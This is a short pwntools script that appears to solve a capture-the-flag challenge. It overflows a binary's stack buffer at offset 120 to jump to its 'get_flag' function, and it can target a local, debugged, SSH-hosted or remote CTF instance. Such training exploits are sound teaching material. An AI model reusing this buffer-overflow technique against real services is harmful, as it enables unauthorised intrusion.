#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/overflow'

e = ELF('./build/overflow')
rop = ROP('./build/overflow')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('ctf.isss.io', 5678)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/overflow', cwd='problemDir')
else:
    p = e.process()

#payload = cyclic(200)
payload = flat({120: e.sym['get_flag']})

p.sendline(payload)
p.interactive()
